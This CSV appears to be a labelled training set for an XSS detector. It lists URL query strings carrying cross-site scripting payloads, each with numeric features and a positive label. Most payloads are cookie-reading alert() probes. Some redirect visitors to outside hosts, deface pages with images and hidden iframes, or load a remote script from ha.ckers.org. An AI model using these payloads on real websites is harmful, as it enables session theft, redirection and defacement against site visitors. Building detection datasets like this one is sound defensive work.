url,len,url_count,evil_char,evil_word,shang,label,,,,,,,,
"lang=E&fnaam=<img+src=""x""+onerror=""alert(/XSS/.source)""+/>&vnaam=",0.089384545,0,1,1,0.59130996,1,,,,,,,,
"pSearch=+""><script>alert(document.cookie)</script>&btnSearch=Search",0.129858056,0,0.777777778,1,0.43319104,1,,,,,,,,
"nbol=&zoomlevel=&plaatsnaam="");alert(1);//&",-0.355824082,0,0.333333333,0.333333333,-0.061686669,1,,,,,,,,
"NewsID=""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.488670194,1,,,,,,,,
"rub_id=IM&libre=""><script>alert(""xss!"")</script>",-0.254640303,0,1,1,0.350990847,1,,,,,,,,
ticker_style=kreuznet&ticker_message=15&newsticker=create&ticker_backcolor=/&ticker_descriptionfont=10&ticker_linkcolor=ff0000&ticker_titlefont=11&ticker_msgspace=5&ticker_tickerdelay=30&ticker_pause=2000&ticker_height=150&ticker_type=scroller&ticker_width=150&ticker_scrollspeed=2&ticker_fontcolor=<script>var+pf_687474703a2f2f7777772e6b7265757a2e6e65742f_7469636b65725f666f6e74636f6c6f72=new+Boolean();alert('XSS');</script>,7.394853368,0,0.888888889,1.333333333,1.092839566,1,,,,,,,,
"id=38&search_type=1&location=""<script>alert(document.cookie)</script>",0.170331568,0,0.666666667,1,0.621442583,1,,,,,,,,
page=home&session=1&msg=ok<script>alert(/XSSED/)</script>,-0.072509501,0,0.777777778,1,0.568417969,1,,,,,,,,
page=home&session=1&msg=ok<script>alert(/XSSED/)</script>,-0.072509501,0,0.777777778,1,0.568417969,1,,,,,,,,
id=<script>alert(document.cookie)</script>,-0.376060837,0,0.555555556,1,0.064464847,1,,,,,,,,
"k=pwn<SCRIPT>alert(""Xacked-by sh3n"");</SCRIPT> <SCRIPT>alert(""pwned"");</SCRIPT> <SCRIPT>alert(""sh3n.net"");</SCRIPT> <script>function do_main(){ window.status=""Xacked by sh3n""; return_result(result_id, ""pwn""); }  do_main();</script><script>function do_main(){ return_result(result_id, ""Redirecting now""); window.location = ""www.sh3n.net""; }  do_main();</script> <script>function do_main(){ document.body.innerHTML = ""Xacked by sh3n""; }  do_main();  return_result(result_id, ""pwn"");</script>pwn&t=r&o=1&s=767czona2",9.135214361,0,5.666666667,17,1.593351285,1,,,,,,,,
"s=""><iframe src=http://xssed.com></iframe>",-0.376060837,1,1,0.666666667,0.160036638,1,,,,,,,,
"section=14""><script>alert('xss')</script>",-0.396297593,0,1,1,0.027545504,1,,,,,,,,
"s='""><script>alert(document.cookie)</script>&action=GO",-0.133219768,0,0.888888889,1,0.464293399,1,,,,,,,,
"action=search&q=1""); alert(document.cookie);//wsx&calendarSearchArrow.x=0&calendarSearchArrow.y=0&calendarSearchArrow=Button",1.283353133,0,0.333333333,0.666666667,0.589815166,1,,,,,,,,
"site_search=""><script>alert(document.cookie)</script>&x=0&y=0",0.008437522,0,0.777777778,1,0.588961621,1,,,,,,,,
"type=<style>body{visibility:hidden;} html{background-color: Black;}</style>'""><div style=""position: absolute;left: 420px;top: 40px;​​z-index: 10;visibility: visible; color: Green; font-size: 40px;""><img src=""http://img257.imageshack.us/img257/3733/77822687.png"" style=""height: 300px; width: 400px;"" alt=""..""><br>We want to be free<br>..<iframe src =http://www.youtube.com/watch?v=9hMrY8jysdg"" width=""0"" height=""0"" \></div>",7.313906345,1,4.666666667,9.333333333,1.77303069,1,,,,,,,,
s=<script>alert(/Xssed By Pierre/)</script>,-0.355824082,0,0.777777778,1.666666667,-0.108361264,1,,,,,,,,
"Name='""><script>alert(document.cookie)</script><!--&city=",-0.072509501,0,1,1,0.640675495,1,,,,,,,,
"control=gsearch.c&c=all&str=""><script>alert(document.cookie)</script>&imageField.x=0&imageField.y=0",0.77743424,0,0.777777778,1,0.621376098,1,,,,,,,,
"what='""><script>alert(document.cookie)</script>",-0.274877059,0,0.888888889,1,0.41610563,1,,,,,,,,
"qs=06oENya4ZG1YS6vOLJwpLiFdjG91IC9SfZ4ddvpDsHazns4nFofKs7RMZXj9LvHVEZ_VaUx3ky945GWGRAyW7BlHvG0czKEF0nqDKxMq-GzNXyYgUvgzMsBvz8uBcgCVnEe38oDFuusR8exNXZKUX1GS2_307KKUlbbgCAKng6qpN1OB8GKyGzh0vvj4HCYPAy3kC7NNVmUJuoeLCh_id8RZGOuKFGPVrWfw1Td0AFNiphGw1CkRka4CA.,YT0z&t=<script>document.location='http://phc.ir'</script>&Submit=+Search+The+Web+",5.553308595,1,1.111111111,0.666666667,2.911782982,1,,,,,,,,
"search_context=245&limit_srch_to_context=false&words='""><script>alert(document.cookie)</script>",0.696487217,0,0.888888889,1,0.677165236,1,,,,,,,,
"ad_partner=""><img src=http://img257.imageshack.us/img257/3733/77822687.png><""",0.332225614,1,1.222222222,0.666666667,0.829827457,1,,,,,,,,
"type=""><img src=http://img257.imageshack.us/img257/3733/77822687.png><""",0.210805079,1,1.222222222,0.666666667,0.71976878,1,,,,,,,,
searWords=<script>document.location='http://phc.ir'</script>&Send=Search&match=0&search=0&items=10&start=150,0.959565042,1,1,0.666666667,0.510372951,1,,,,,,,,
searWords=<script>document.location='http://phc.ir'</script>&Send=Search&match=0&search=0&items=30&start=0,0.91909153,1,1,0.666666667,0.429341128,1,,,,,,,,
"option=com_search&Itemid=38&searchword=""><img src=http://img257.imageshack.us/img257/3733/77822687.png><""<script>alert('www.InSecurity.Ro')</script>""><img+src=http://img257.imageshack.us/img257/3733/77822687.png><""&go=",3.185608173,1,3.222222222,2,1.325466366,1,,,,,,,,
"lookfor=""></object><script>alert(""www.InSecurity.Ro"")</script>&type=all&start_over=1&submit=Find",0.716723973,0,1.333333333,1,1.027814762,1,,,,,,,,
"lista=""><script>alert(document.cookie)</script>",-0.274877059,0,0.777777778,1,0.141738199,1,,,,,,,,
sq=<script>alert(document.cookie)</script>,-0.376060837,0,0.555555556,1,0.160036638,1,,,,,,,,
"s=""><script>alert(String.fromCharCode(88,83,83))</script>",-0.072509501,0,1,1,0.710366322,1,,,,,,,,
kryword=<script>alert(document.cookie)</script>,-0.274877059,0,0.555555556,1,0.219406903,1,,,,,,,,
"id=5014""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.514020396,1,,,,,,,,
"id=linegame""><script>alert(document.cookie)</script>",-0.17369328,0,0.777777778,1,0.259588396,1,,,,,,,,
"id=1823596,1823596""><script>alert(document.cookie)</script>",-0.03203599,0,0.888888889,1,0.930798028,1,,,,,,,,
szuk=><script>alert(document.cookie)</script>,-0.31535057,0,0.666666667,1,0.195635479,1,,,,,,,,
"id=1524_0_8_0_c""><script>alert(document.cookie)</script>",-0.092746257,0,0.777777778,1,0.725514137,1,,,,,,,,
"id=57""><script>alert(document.cookie)</script>",-0.295113814,0,0.777777778,1,0.340556611,1,,,,,,,,
"id=66988""><script>alert(document.cookie)</script>",-0.234403547,0,0.777777778,1,0.465351516,1,,,,,,,,
"mesage=""><script>alert(String.fromCharCode(88,83,83))</script>",0.028674277,0,1,1,0.728857227,1,,,,,,,,
responsemessage=XSS'd by Squid<script>alert(document.cookie)</script>,0.170331568,0,0.666666667,1.666666667,0.655131462,1,,,,,,,,
cx=partner-pub-8290526608142878:22o1omua7nj&cof=FORID:10&ie=ISO-8859-1&q=<script>alert('XSS')</script>&sa=Search&siteurl=www.wisegeek.com/what-is-bodybuilding.htm,2.052349852,0,0.888888889,1,1.891091507,1,,,,,,,,
"type=Cat&gender=any&breed=""'><script>alert(document.cookie)</script>&name=""'><script>alert(document.cookie)</script>&loc=&order=asc",1.425010424,0,1.777777778,2,0.534059057,1,,,,,,,,
"q=</title>""'><script>alert('XSSed+by+thejanky')</script>&publication=",0.170331568,0,1.444444444,1,0.815868763,1,,,,,,,,
"msg=<script>alert(""watermy"")</script>",-0.477244616,0,0.777777778,1,-0.066317069,1,,,,,,,,
"searchTxt=""><script>alert(document.cookie)</script>&browsetype=-1&browsetone=-1&search_style[]=0&search_style[]=1&search_style[]=2&search_style[]=3&search_style[]=4&search_style[]=5&search_style[]=6&search_style[]=7&search_style[]=8&search_category[]=0&search_category[]=1&search_category[]=2&search_category[]=4&search_category[]=5&search_category[]=6&search_category[]=8&search_category[]=9&search_category[]=12&search_category[]=13&search_category[]=14&search_category[]=15&search_category[]=16&search_category[]=17&search_category[]=18&search_category[]=19&browseupdate=any&browsenum=2&browsenum_low=0&browsenum_high=0&sortby=read&submit=Go!",11.82670288,0,0.777777778,1,0.663133609,1,,,,,,,,
"search_id=""></title><script>alert(""XSS"")</script><style>body{visibility:hidden;} html{background-color: Black;}</style>'""><div style=""position: absolute;left: 420px;top: 40px;​​z-index: 10;visibility: visible; color: White; font-size: 40px;""><img src=""http://i28.tinypic.com/1j402t.jpg"" style=""height: 400px; width: 400px;"" alt=""By Sony""><br>Insecurity Romania<br>by Sony<iframe src =http://www.youtube.com/watch?v=atzIya14uV4"" width=""0"" height=""0"" \></div>",8.022192796,1,5.777777778,10,1.66777041,1,,,,,,,,
"status=all&cat=boxer&first_name=""'><script>alert('XSSed by thejanky')</script>&last_name=""'><script>alert('XSSed by thejanky')</script>&submit=Go",1.708325004,0,2.222222222,3.333333333,0.999758275,1,,,,,,,,
"a=3&aa=1&category_id=2""><script>alert(document.cookie)</script>",0.048911033,0,0.777777778,1,0.650660629,1,,,,,,,,
subSection=</title><script>alert(1)</script>,-0.335587326,0,0.888888889,1,-0.10123554,1,,,,,,,,
q=<body+onload=alert(0)>&x=0&y=0,-0.578428395,0,0.222222222,0.666666667,-0.101302647,1,,,,,,,,
"adminid=12831&actfilt=-1&ban_month=1&ban_year=0&s=>""><script>alert(document.cookie)</script>",0.63577695,0,0.888888889,1,0.976112599,1,,,,,,,,
"search_string="">'><script>alert(document.cookie)</script><iframe src=http://xssed.com></iframe>",0.696487217,1,1.777777778,1.666666667,0.584616271,1,,,,,,,,
"site=www.aegonbank.nl&mediasurface_target=/?view=Search+results&view=Search+results&freesearch=""><script>alert(document.cookie)</script>",1.526194202,0,0.888888889,1,0.702193326,1,,,,,,,,
id=<script>alert('eXeSoul here')</script>,-0.396297593,0,0.777777778,1.333333333,0.165531766,1,,,,,,,,
message=Your userNAME or password <script>alert(document.cookie)</script>&userNAME=sdfsd3584303778680302374,0.939328286,0,0.555555556,2.333333333,1.221415614,1,,,,,,,,
search[query]=<script>alert(document.cookie)</script>&search[author_id]=,0.231041835,0,0.555555556,1,0.53318812,1,,,,,,,,
"q=<iframe src=""http://xssed.com"">",-0.558191639,1,0.666666667,0.666666667,0.342195649,1,,,,,,,,
"s=<iframe+src=""http://xssed.com""+width=""800""+height=""800"">&x=0&y=0",0.1096213,1,1.111111111,0.333333333,0.506214376,1,,,,,,,,
showmsg=IiwgIiIpOy0tPjwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwOi8veHNzZWQuY29tIj48IS0t,0.392935881,0,0,0,1.67964928,1,,,,,,,,
"s=""/></script><script>alert(""XSS:+Vijayendra"")</script>",-0.112983013,0,1.444444444,1.333333333,0.312466818,1,,,,,,,,
"q=""/><script>alert(/XSS: Vijayendra/)</script>",-0.295113814,0,1.111111111,1.333333333,0.480722581,1,,,,,,,,
"args=qs=06oENya4ZG1YS6vOLJwpLiFdjG91IC1RkO08oFqj4WKjz3hhCh4_rZmjGDC0wB9Bn-fnhmp9hsVa4nUiruSAO9uJS-sbtqaZZpS-_sK59tAtaT9-SeIk01j0rtzjQ2D6loA9vPKLzbOCBVKDTJfZr4go68US3usKdAyRWLucoz0c1V-Sic6OnrPapM27KS07H7-Vnbmnn-DdgKvKyJShA5ML5K0sO0YnM1YHKJKMVf5wlgbVtJuZf-pKhhS8XPuu9q2anUrIge4Us.,YT0zO2s9NQ..&uid=w054d08f1c7e4ac95.92774336&src=&sec=sb&term=""/><script>alert(""XSS:+Vijayendra"")</script>&Submit=Search",6.828224207,0,1.222222222,1.333333333,2.820805135,1,,,,,,,,
"option=""/><script>alert(""XSS: Vijayendra"")</script>",-0.193930036,0,1.111111111,1.333333333,0.502937,1,,,,,,,,
lookfor=<script>alert('**XSSED**+By+Cir0');</script>&type=AllFields&submit=Find,0.372699125,0,0.777777778,1,1.23627935,1,,,,,,,,
"st=<iframe+src=""http://xssed.com""+width=""800""+height=""800"">&x=0&y=0&lp=&hp=&auc=1",0.413172637,1,1.111111111,0.333333333,0.655095127,1,,,,,,,,
lookfor=<script>alert('**XSSED**+By+Cir0');</script>&type=AllFields,0.129858056,0,0.777777778,1,1.024332532,1,,,,,,,,
s=<script>alert(document.cookie)</script>,-0.396297593,0,0.555555556,1,0.061149985,1,,,,,,,,
_nfpb=true&portlet_13_1_actionOverride=<script>alert('Sandeep l337')</script>&_windowLabel=portlet_13_1&_pageLabel=IDEA_Page_ForgotPassword,1.58690447,0,0.777777778,1.333333333,1.048535341,1,,,,,,,,
"d=0&domain=""><script>alert('Xss By Sandeep l337')</script>&Submit=Search",0.231041835,0,1,2,1.037049216,1,,,,,,,,
program_id=<script>alert('your redirection database is huge')</script>,0.190568323,0,0.777777778,2.333333333,0.356230661,1,,,,,,,,
_58_struts_action=/login/create_account&p_p_id=1<ScRiPt>prompt(123)</ScRiPt>&p_p_lifecycle=1&p_p_mode=view&p_p_state=maximized&saveLastPath=0,1.627377981,0,0.777777778,1,0.984183471,1,,,,,,,,
_58_struts_action=/login/create_account&p_p_id=1<ScRiPt>prompt(123)</ScRiPt>&p_p_lifecycle=1&p_p_mode=view&p_p_state=maximized&saveLastPath=0,1.627377981,0,0.777777778,1,0.984183471,1,,,,,,,,
_58_struts_action=/login/create_account&p_p_id=1<ScRiPt>prompt(123)</ScRiPt>&p_p_lifecycle=1&p_p_mode=view&p_p_state=maximized&saveLastPath=0,1.627377981,0,0.777777778,1,0.984183471,1,,,,,,,,
"cmarque=&modele=""><script>alert(1)</script>",-0.355824082,0,0.777777778,1,0.237234986,1,,,,,,,,
_58_struts_action=/login/create_account&p_p_id=1<ScRiPt>prompt(123)</ScRiPt>&p_p_lifecycle=1&p_p_mode=view&p_p_state=maximized&saveLastPath=0,1.627377981,0,0.777777778,1,0.984183471,1,,,,,,,,
"p=szukaj&g=all&n=""/><script>alert(document.cookie);</script><&x=41&y=9",0.190568323,0,1,1,1.005593381,1,,,,,,,,
q=<script>alert('XSS')</script>&x=0&y=0,-0.436771105,0,0.777777778,1,0.328273585,1,,,,,,,,
s=<script>alert(document.cookie)</script>&x=0&y=0,-0.234403547,0,0.555555556,1,0.481478004,1,,,,,,,,
"login=""><iframe src=""http://brenn0.wordpress.com"">",-0.214166791,1,0.888888889,0.666666667,0.60125596,1,,,,,,,,
lid=header&searchWords=<script>alert('XSS')</script>   ,-0.112983013,0,0.777777778,2,0.315393618,1,,,,,,,,
q=<script>alert('XSS')</script>&x=0&y=0 XSS&Script Insertion,-0.011799234,0,0.777777778,2,0.527097389,1,,,,,,,,
"string=xss""><script>alert('XSS')</script>&x=0&y=0   Script Insertion&XSS",0.231041835,0,1,2.666666667,0.522274579,1,,,,,,,,
e=</script><script>alert(document.cookie)</script>,-0.214166791,0,0.888888889,1.333333333,-0.030923025,1,,,,,,,,
msg=<script>alert(document.cookie)</script>,-0.355824082,0,0.555555556,1,0.180639186,1,,,,,,,,
"ricerca=>""<script>alert(document.cookie)</script>&sezione=0&difficolta=0&tempi=-1&invia=raffina+la+ricerca",0.91909153,0,0.777777778,1,0.491578903,1,,,,,,,,
"msg=<script>alert(""Brenn0"")</script>",-0.497481372,0,0.777777778,1,0.057919089,1,,,,,,,,
"q=""><script>alert(document.cookie)</script>",-0.355824082,0,0.777777778,1,0.255611682,1,,,,,,,,
"id=1499""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.446857535,1,,,,,,,,
"uGlobalSearch=""><script>alert('XSS')</script>&x=0&y=0",-0.153456524,0,1,1,0.715559024,1,,,,,,,,
"uGlobalSearch=""><script>alert('XSS')</script>&x=0&y=0",-0.153456524,0,1,1,0.715559024,1,,,,,,,,
"uGlobalSearch=""><script>alert('XSS')</script>&x=0&y=0",-0.153456524,0,1,1,0.715559024,1,,,,,,,,
"uGlobalSearch=""><script>alert(123)</script>&x=0&y=0",-0.193930036,0,0.777777778,1,0.771279494,1,,,,,,,,
"uGlobalSearch=""><script>alert('XSS')</script>&x=0&y=0",-0.153456524,0,1,1,0.715559024,1,,,,,,,,
"search_str=xss""><script>alert('XSS')</script>",-0.31535057,0,1,1,-0.022862876,1,,,,,,,,
_58_struts_action=/login/create_account&p_p_id=1<ScRiPt>prompt(123)</ScRiPt>&p_p_lifecycle=1&p_p_mode=view&p_p_state=maximized&saveLastPath=0,1.627377981,0,0.777777778,1,0.984183471,1,,,,,,,,
"pg=charts&at=bcharts&at2=sab&objekt_id=294""><script>alert(document.cookie)</script>",0.453646148,0,0.777777778,1,0.708420163,1,,,,,,,,
"search=""><script>alert(document.cookie)</script>&cauta=",-0.112983013,0,0.777777778,1,0.253851958,1,,,,,,,,
"cauta_sub=Cauta&cautare=""><script>alert(document.cookie)</script>",0.089384545,0,0.777777778,1,0.267978284,1,,,,,,,,
type=title&kword=<script>alert(document.cookie)</script>,-0.092746257,0,0.555555556,1,0.225050408,1,,,,,,,,
q=<script>alert('XSS')</script>,-0.598665151,0,0.777777778,1,-0.115840756,1,,,,,,,,
cod=<script>alert(document.cookie)</script>,-0.355824082,0,0.555555556,1,0.026950613,1,,,,,,,,
bannerid=18400&zoneid=761&cb=3&url=http://hexjector.net,-0.112983013,1,0.222222222,0,0.69403637,1,,,,,,,,
campaignid=2944&adid=23281&zoneid=4316&pubid=362&url=http://hexjector.net,0.251278591,1,0.222222222,0,0.848409823,1,,,,,,,,
"cx=partner-pub-1479221093707471:7x8rddmx8nb&cof=FORID:11&ie=ISO-8859-1&q='>""><script>alert(/Hexon xssedsmart-telecom.co.id/)</script>&sa=OK322",1.647614737,0,1.222222222,1.333333333,1.780585376,1,,,,,,,,
"lang=&country=NL&day=1""'><script src=http://ha.ckers.org/xss.js></script>",0.251278591,1,1.222222222,1.333333333,0.786655361,1,,,,,,,,
s=<script>alert(document.cookie)</script>,-0.396297593,0,0.555555556,1,0.061149985,1,,,,,,,,
palabra=<script>alert(/xssed by orange/.source)</script>,-0.092746257,0,0.777777778,1.666666667,0.290315625,1,,,,,,,,
"source=""><script>alert(""Rogunix"")</script><iframe src=http://xssed.com heigth=100% width=100%></iframe>",0.858381263,1,1.777777778,2.333333333,0.939928267,1,,,,,,,,
"marque=<iframe+src=""http://xssed.com"">",-0.45700786,1,0.666666667,0.333333333,0.368252848,1,,,,,,,,
"search=<iframe src=""http://xssed.com"">&x=0&y=0",-0.295113814,1,0.666666667,0.666666667,0.437091981,1,,,,,,,,
"movieid=3847&moviename=3d Resident Evil Afterlife&m=3d Resident Evil Af""/><script>alert(1);</script>xxxxterlife",1.020275309,0,0.888888889,3,0.835661583,1,,,,,,,,
"busca=""><script>alert(document.cookie)</script>&Buscar.x=14&Buscar.y=7",0.190568323,0,0.777777778,1,0.723703373,1,,,,,,,,
q=<script>alert(document.cookie)</script>&restrict=&btnG.x=25&btnG.y=5&btnG=Search+axis.com&entqr=0&entsp=0&sort=date:D:L:d1&output=xml_no_dtd&ie=UTF-8&lr=UTF-8&btnG.y=14&btnG.y=13&client=axis_com&btnG.x=19&btnG.x=15&ud=1&site=All_sites&oe=UTF-8&proxystylesheet=axis_com,4.237919472,0,0.555555556,1,1.276165667,1,,,,,,,,
"idFinal=1202810198561tocoto--><iframe src=""http://xssed.com""><!--",0.089384545,1,0.888888889,0.666666667,1.140325193,1,,,,,,,,
"p='""></title><script>alert(""XSS"")</script><style>body{visibility:hidden;} html{background-color: Black;}</style>'""><div style=""position: absolute;left:420px;top: 40px;​​z-index: 10;visibility: visible; color: White; font-size:20px;""><img src=""http://i29.tinypic.com/34nmx5j.jpg"" style=""height: 400px; width: 400px;"" alt=""BySony""><br>InSecurity Romania<br>",5.95804371,1,4.444444444,7,1.619455707,1,,,,,,,,
"page=""></title><script>alert(""XSS"")</script><style>body{visibility:hidden;} html{background-color: Black;}</style>'""><div style=""position: absolute;left: 420px;top:40px;​​z-index: 10;visibility: visible; color: White; font-size: 40px;""><imgsrc=""http://i29.tinypic.com/34nmx5j.jpg"" style=""height: 400px; width: 400px;"" alt=""BySony""><br>InSecurity Romania<br>by Sony<iframe src =http://www.youtube.com/watch?v=5wkogdMsCKI""width=""0"" height=""0"" \></div>",7.86029875,1,5.777777778,8.666666667,1.747286907,1,,,,,,,,
"Action=""><script>alert('Xss by __Genius__')</script>",-0.17369328,0,1,1.666666667,0.495473884,1,,,,,,,,
"id=789""><script>alert(""xssed by prashant"")</script>",-0.193930036,0,1,1.666666667,0.428203606,1,,,,,,,,
a1=&a2=<br /><script>alert('XSS By NBK')</script>,-0.234403547,0,1.111111111,2,0.637895235,1,,,,,,,,
"t=""><iframe src=""http://xssed.com"">",-0.517718128,1,0.888888889,0.666666667,0.191100323,1,,,,,,,,
search=</TITLE><script>alert(document.cookie)</script>,-0.133219768,0,0.888888889,1,0.489807912,1,,,,,,,,
"tag=<iframe src=""http://xssed.com"">",-0.517718128,1,0.666666667,0.666666667,0.317975381,1,,,,,,,,
"q=<iframe src=""http://xssed.com"">",-0.558191639,1,0.666666667,0.666666667,0.342195649,1,,,,,,,,
"name=The Alien Police""><script>alert(document.cookie)</script>",0.028674277,0,0.777777778,1.666666667,0.485485268,1,,,,,,,,
id=10158&name=<iframe src=//xssed.com>,-0.45700786,0,0.444444444,0.666666667,0.28341555,1,,,,,,,,
"nome=""><script>alert(document.cookie);</script>",-0.274877059,0,0.777777778,1,0.24872145,1,,,,,,,,
"modelsearch=yes&modelNumber=""/><script>alert(""XSS:+Vijayendra"")</script>",0.231041835,0,1.111111111,1,0.859825524,1,,,,,,,,
"query=""""><iframe src=""http://xssed.com""><img src=""",-0.214166791,1,1.222222222,1.333333333,0.432163115,1,,,,,,,,
"query=""/><script>alert(""XSS:+Vijayendra"")</script>&commit=Search",0.069147789,0,1.111111111,1,0.786383321,1,,,,,,,,
"cof=FORID:10&cx=018072894833368049022:lj4hepffnaa&q=http://media2.pl/szukaj/?cof=FORID:10&cx=018072894833768049022:lj4hepffnaa&q=<iframe src=""http://xssed.com"">",2.01187634,1,1.111111111,0.666666667,1.649983771,1,,,,,,,,
"k=<script>alert(""XSS"")</script>",-0.598665151,0,0.777777778,1,-0.115840756,1,,,,,,,,
"q=<script>alert(""XSS"")</script>&siteurl=www.tuttitalia.it/sicilia/",0.1096213,0,1,1,0.004829578,1,,,,,,,,
mode=Link&msg=<script>alert(document.cookie)</script>,-0.153456524,0,0.555555556,1,0.381606526,1,,,,,,,,
"s=h&t=M""/>a<iframe src=""http://xssed.com"">",-0.376060837,1,1,0.666666667,0.342523408,1,,,,,,,,
